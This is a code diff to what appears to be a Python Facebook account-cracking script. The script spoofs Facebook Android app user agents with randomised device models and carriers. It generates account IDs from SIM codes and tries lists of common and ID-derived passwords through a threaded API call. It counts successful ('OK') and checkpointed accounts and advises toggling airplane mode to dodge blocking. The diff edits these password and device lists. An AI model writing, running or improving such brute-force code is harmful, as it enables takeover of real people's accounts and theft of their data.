@@ -32,7 +32,7 @@ totaldmp = 0;count = 0;loop = 0;oks = [];cps = [];id = [];ps = [];sid = [];total
 #-----------------------❲ GRAPH & API USER AGENT ❳-----------------------user0port random
 import random
 
-def generate_random_user0_agent():
+def generate_random_user_agent():
     user_agent_template = (
         '[FBAN/FB4A;FBAV/{version};FBBV/{version_code};FBDM/{{density={device_density},width=1080,height=1920}};'
         'FBLC/{language};FBRV/{revision};FBCR/{carrier};FBMF/{manufacturer};FBBD/{brand};FBPN/{package};FBDV/{device};'
@@ -52,12 +52,7 @@ def generate_random_user0_agent():
     os_version = "9.0.1"
     cpu_architecture = random.choice(["armeabi-v7a", "arm64-v8a"])
     sim_name = random.choice(['Banglalink', 'Robi', 'MTN-CG', 'Grameenphone', 'Artel', 'Teletalk', 'UMobaile', 'Digi'])
-    model_name = random.choice([
-        "CPH2499", "POCOPHONE F1", "CPH2083", "Xiaomi_Mi_Mix_10", "Redmi Note 7 Pro", "CPH2185", "CPH2065",
-        "CPH2197", "CPH1989", "Redmi Note 8", "Redmi Note 9 Pro", "Redmi 8A", "MI PLAY", "OPPO A57", "CPH2145",
-        "Mi Note 10 Lite", "MI PAD 4", "F1w", "Redmi 5 Plus", "CPH1909", "CPH2065", "CPH1937", "CPH2249",
-        "CPH2095", "CPH2083", "CPH1979", "CPH2067", "CPH2015", "CPH2021", "CPH2205", "CPH2207", "CPH1909",
-        "CPH1801", "CPH1911", "CPH1901", "CPH1727", "1201", "Xiaomi"])
+    model_name = random.choice(["GT-I9505","SM-A720F","Z987","SM-G950U","MI 5X","SM-G925F","SM-N9005","CPH1909","SM-A1","COL-L29","moto g(20)","Xiaomi","SM-A505FM","SM-A115M","SM-G986U","SM-A102U","SM-G930V","ASUS_Z00AD","ASUS_Z016D","SM-J320F","SM-G3518","SM-G925F","SM-G955F","HUAWEI LUA-L21","SM-A515F","ATU-L31","LM-X120","YAL-L21","Lenovo A6020a46","FIG-LX1","Kirin Treble","DUB-LX1","SM-J410G","SM-S111DL","ZTE Blade A5 2019"])
 
     return user_agent_template.format(
         version=version,
@@ -180,13 +175,13 @@ predefined_user_agents = [
 for agent in predefined_user_agents:
     print(agent)
 # Add the generated random user agent to the predefined list
-all_user_agents = [generate_random_user0_agent()] + predefined_user_agents
+all_user_agents = [generate_random_user_agent()] + predefined_user_agents
 
 # Randomly select a user agent
 selected_user_agent = random.choice(all_user_agents)
 
 # Print the selected user agent
-print(generate_random_user0_agent)
+print(selected_user_agent)
 #-----------------------❲ HOST USER AGENT ❳-----------------------#
 def ___sex___():
     version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
@@ -509,8 +504,8 @@ def ___bd2___():
         print(f'{xdxx} TOTAL UID {xdxx}{G} '+tl);print(f'{xdxx} SIM CODE  {xdxx}{G} '+code);print(f'{xxdx} FIRST ON{W}/{R}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'113355','008866','12345@','@@@###','123456@#','rasel123','i love you','708090','203040','506070','ayesha','bangladesh','jannat','018895','105144','708090','506070','121234','first6','first8','last6','last8','first11','jannat','@#৳%&*','sadiya']
-            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'113355','008866','12345@','@@@###','123456@#','rasel123','i love you','708090','203040','506070','ayesha','bangladesh','jannat','018895','105144','708090','506070','121234','first6','first8','last6','last8','first11','jannat','@#৳%&*','sadiya']
+            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'113355','008866','12345@','@@@###','123456@#','rasel123','i love you','708090','203040','506070','bangladesh','jannat','018895','105144','708090','506070','121234','first8','last8','first11','jannat','@#৳%&*','sadiya']
+            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'113355','008866','12345@','@@@###','123456@#','rasel123','i love you','708090','203040','506070','bangladesh','jannat','018895','105144','708090','506070','121234','first8','first last','last8','first11','jannat','@#৳%&*','sadiya']
             __bal__.submit(___API___,ids,pwx,tl)
     print('');linex();print(f'{xdxx} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xxdx} TOTAL CP {xxdx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM INDIA ❳-----------------------#
